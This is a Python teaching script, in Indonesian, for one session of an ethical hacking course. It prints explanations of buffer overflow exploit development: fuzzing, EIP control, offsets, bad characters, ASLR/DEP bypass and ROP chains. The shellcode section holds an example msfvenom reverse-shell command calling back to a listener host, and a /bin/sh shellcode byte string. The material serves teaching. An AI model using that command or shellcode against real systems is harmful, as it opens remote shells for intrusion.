#!/usr/bin/env python3
"""Sesi 8: Exploit Development — Buffer Overflow"""

import subprocess
import sys
import os
import struct


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 8")
    print("  Exploit Development — Buffer Overflow")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name, cmd_flag=None):
    cmd = name if cmd_flag is None else cmd_flag
    try:
        subprocess.check_output([cmd, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── Simulasi vulnerable function ──
BUFFER_SIZE = 64


def vulnerable_buffer(data):
    """Simulasi buffer overflow: buffer tetap meski data besar."""
    # buffer[BUF_SIZE] — data lebih besar akan overflow
    overflow_len = len(data) - BUFFER_SIZE
    if overflow_len > 0:
        print(f"  ⚠️  OVERFLOW! Data {len(data)} bytes melebihi buffer {BUFFER_SIZE} bytes")
        print(f"  ⚠️  {overflow_len} bytes menimpa stack di luar buffer")
        return overflow_len
    return 0


def fuzzer_demo():
    """Simulasi fuzzing — mengirim data semakin besar."""
    print("  💡 Simulasi Fuzzing: Kirim data dengan ukuran bertahap\n")
    for length in [32, 64, 72, 80, 100, 200, 500]:
        data = "A" * length
        overflow = vulnerable_buffer(data)
        if overflow > 0:
            print(f"     → {length:>4} bytes: {'❌ CRASH!' if overflow > 8 else '⚠️ Near limit'}")
        else:
            print(f"     → {length:>4} bytes: ✅ Aman")
    print("\n  🔥 Fuzzing bertujuan menemukan ukuran tepat saat program crash!")
    print()


def eip_control_demo():
    """EIP (Extended Instruction Pointer) control concept."""
    print("  EIP = Extended Instruction Pointer — menunjukkan alamat instruksi")
    print("  yang sedang dieksekusi oleh CPU.\n")

    print(f"  {'Konsep':<25} {'Penjelasan':<45}")
    print(f"  {'─' * 70}")
    print(f"  {'EIP Normal':<25} {'Menunjuk ke instruksi valid (0x08048400)':<45}")
    eip_overflow = "Tertimpa data " + "A" * 16 + " (0x41414141)"
    print(f"  {'EIP Overflow':<25} {eip_overflow:<45}")
    print(f"  {'EIP Controlled':<25} {'Nilai ditentukan attacker (0xdeadbeef)':<45}")
    print()

    # Simulasi offset calculation
    print("  💡 Pattern Offset Calculation:")
    print("     pattern = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...")
    print("     Saat EIP = 0x41326641 → pattern 'Af2A'")
    print("     Offset = cyclic_find('Af2A') = 72 bytes\n")
    print("  🔥 Offset = jumlah data sebelum EIP dapat dikontrol!")
    print()


def badchars_demo():
    """Bad character detection simulation."""
    print("  💡 Bad Character Detection:")
    badchars_demo_all = bytes(range(0x00, 0x100))  # 0x00 - 0xFF
    known_bad = bytes([0x00, 0x0a, 0x0d])  # null, LF, CR

    # Filter bad chars
    clean = bytes(b for b in badchars_demo_all if b not in known_bad)

    print(f"  {'Karakter':<20} {'Status':<25}")
    print(f"  {'─' * 45}")
    for b in [0x00, 0x0a, 0x0d, 0x41, 0x90, 0xcc, 0xff]:
        status = "❌ BADCHAR" if b in known_bad else "✅ Aman"
        char_desc = f"0x{b:02x} ({chr(b) if 32 <= b < 127 else '?'})"
        print(f"  {char_desc:<20} {status:<25}")
    print()

    print("  🔥 Bad char umum: 0x00 (null), 0x0A (newline), 0x0D (CR)")
    print("     Jumlah bad chars = jumlah byte yang tidak bisa dipakai shellcode\n")


def shellcode_demo():
    """Simulasi generate shellcode."""
    print("  💡 Simulasi Shellcode Generation (msfvenom):\n")

    # Simulasi reverse shell shellcode (tidak real, hanya ilustrasi)
    shellcode_hex = (
        "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x68"
        "\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89"
        "\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd"
        "\\x80"
    )

    print(f"  Contoh perintah:")
    print(f"    msfvenom -p linux/x86/shell_reverse_tcp \\")
    print(f"             LHOST=192.168.1.10 LPORT=4444 \\")
    print(f"             -f c -b '\\x00\\x0a\\x0d'\\n")
    sc_byte_count = len(shellcode_hex.split("\\x")) - 1
    print(f"  Shellcode output ({sc_byte_count} bytes, contoh):")
    print(f"    {shellcode_hex[:80]}...")
    print()

    # Alokasi shellcode
    print(f"  🔥 Shellcode harus muat di buffer setelah EIP.")
    print(f"     Buffer tersisa = total_buf - offset - 8 (ESP jump)")
    print()


def aslr_dep_demo():
    """ASLR and DEP bypass concept."""
    print("  🔒 ASLR (Address Space Layout Randomization):")
    print("     → Alamat memori stack/heap/library diacak setiap proses jalan")
    print("     → Bypass: ROP (Return-Oriented Programming)\n")

    print("  🛡️  DEP / NX (Data Execution Prevention):")
    print("     → Mencegah eksekusi code di stack (non-executable)")
    print("     → Bypass: ret2libc, ROP chains\n")

    print(f"  {'Teknik':<20} {'Untuk':<25} {'Cara':<35}")
    print(f"  {'─' * 80}")
    print(f"  {'ret2libc':<20} {'DEP only':<25} {'Panggil system() dari libc':<35}")
    print(f"  {'ROP chain':<20} {'ASLR + DEP':<25} {'Gadget -> chain -> shell':<35}")
    print(f"  {'JOP':<20} {'ASLR + DEP':<25} {'Jump-Oriented Programming':<35}")
    print(f"  {'Stack Pivot':<20} {'Stack terbatas':<25} {'Pindah ESP ke heap':<35}")
    print()


def rop_chain_demo():
    """ROP chain concept simulation."""
    print("  💡 ROP Chain Concept:")
    print("     Gadget = instruksi + ret (pop eax; ret)")
    print("     Chain  = urutan gadget untuk mencapai tujuan\n")

    gadgets = [
        ("pop eax; ret",       "0x080b81c6", "isi eax = SYS_execve (11)"),
        ("pop ebx; ret",       "0x080481c9", "isi ebx = addr '/bin/sh'"),
        ("pop ecx; ret",       "0x080de955", "isi ecx = 0 (argv=NULL)"),
        ("int 0x80",           "0x08049503", "panggil syscall"),
    ]

    print(f"  {'Gadget':<25} {'Alamat':<15} {'Fungsi':<30}")
    print(f"  {'─' * 70}")
    for g, addr, desc in gadgets:
        print(f"  {g:<25} {addr:<15} {desc:<30}")
    print()

    print("  Chain constructed:")
    print("    [gadget1 addr] [arg1] [gadget2 addr] [arg2] ...")
    print("    → Setiap gadget pop → ret dilanjutkan ke gadget berikutnya\n")


def analogi():
    """Analogi untuk buffer overflow."""
    print("""
  ╔══════════════════════════════════════════════════════════╗
  ║   🥤 GELAS TUMPAH (Buffer Overflow)                     ║
  ║      → Gelas kecil (buffer) diisi air terus menerus     ║
  ║      → Air tumpah mengotori meja (stack corruption)     ║
  ║                                                        ║
  ║   📺 REMOTE TV (EIP Control)                           ║
  ║      → Remote TV mengontrol channel (EIP)              ║
  ║      → Attacker pegang remote → ganti channel ke shell ║
  ║                                                        ║
  ║   📦 POSISI LEMARI DIACAK (ASLR)                      ║
  ║      → Setiap buka pintu, lemari pindah posisi         ║
  ║      → Sulit lempar bola ke lemari (sulit ROP)         ║
  ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    banner()

    # ── [1] Tool Check ──
    section(1, "PENGECEKAN TOOL")
    tools = {
        "gdb (debugger)": check_tool("gdb"),
        "python3": check_tool("python3", "python3"),
        "msfvenom": check_tool("msfvenom", "msfvenom"),
        "nasm": check_tool("nasm", "nasm"),
        "objdump": check_tool("objdump", "objdump"),
    }
    print(f"  {'Tool':<25} {'Status':<20}")
    print(f"  {'─' * 45}")
    for tool, status in tools.items():
        print(f"  {tool:<25} {status:<20}")
    print()

    # ── [2] Fuzzing Concept ──
    section(2, "FUZZING — CARI TITIK CRASH")
    print(f"  Buffer size: {BUFFER_SIZE} bytes\n")
    fuzzer_demo()

    # ── [3] EIP Control ──
    section(3, "EIP CONTROL — KENDALIKAN EKSEKUSI")
    eip_control_demo()

    # ── [4] Pattern Offset ──
    section(4, "PATTERN OFFSET — HITUNG POSISI EIP")
    print("  💡 Metode:")
    print("     1. Generate pattern:  Aa0Aa1Aa2Aa3Aa4...Aa9Ab0Ab1...")
    print("     2. Crash: EIP = 0x41326641")
    print("     3. Decode: pattern 'Af2A' = offset 72")
    print()
    print(f"  Hasil: offset = 72 bytes (dari 100-byte buffer)")
    print(f"  ├── 72 bytes → padding (isi buffer)")
    print(f"  ├── 4 bytes  → overwrite EIP")
    print(f"  └── sisanya  → shellcode / NOP sled")
    print()

    # ── [5] Bad Characters ──
    section(5, "BAD CHARACTER DETECTION")
    badchars_demo()

    # ── [6] Shellcode Generation ──
    section(6, "SHELLCODE GENERATION (msfvenom)")
    shellcode_demo()

    # ── [7] ASLR/DEP Bypass ──
    section(7, "ASLR & DEP BYPASS")
    aslr_dep_demo()

    # ── [8] ROP Chain ──
    section(8, "ROP CHAIN CONCEPT")
    rop_chain_demo()

    # ── [9] Analogi ──
    section(9, "ANALOGI BUFFER OVERFLOW")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 8 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • Fuzzing → cari ukuran crash")
    print("    • Offset → hitung posisi EIP")
    print("    • Badchars → filter bytes terlarang")
    print("    • Shellcode → payload untuk eksekusi")
    print("    • ASLR/DEP bypass → ROP chain, ret2libc")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Buat binary vulnerable C, exploit dengan pattern offset")
    print("    2. Generate shellcode dengan msfvenom & encode")
    print("    3. Buat ROP chain manual menggunakan ROPgadget")
    print("    4. Coba ret2libc pada binary dengan DEP enabled")
    print("    5. Analisis binary dengan checksec (pwntools)")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
